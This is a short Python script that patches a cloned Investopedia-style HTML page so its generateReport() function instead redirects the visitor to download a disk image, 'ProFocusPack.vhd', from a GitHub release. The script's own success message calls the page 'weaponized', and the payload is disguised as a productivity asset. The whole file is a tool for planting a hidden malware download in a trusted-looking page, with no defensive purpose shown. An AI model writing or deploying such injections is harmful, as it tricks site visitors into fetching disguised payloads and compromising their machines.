import os

path = "inv_edu_44f/index.html"
if not os.path.exists(path):
    print(f"[-] Error: {path} not found.")
else:
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()

    target = "function generateReport(){"
    replacement = "function generateReport(){ window.location.href='https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd'; return;"

    if target in content:
        content = content.replace(target, replacement)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print("[+] SUCCESS: Investopedia weaponized flawlessly.")
    else:
        print("[-] ERROR: Target function not found.")
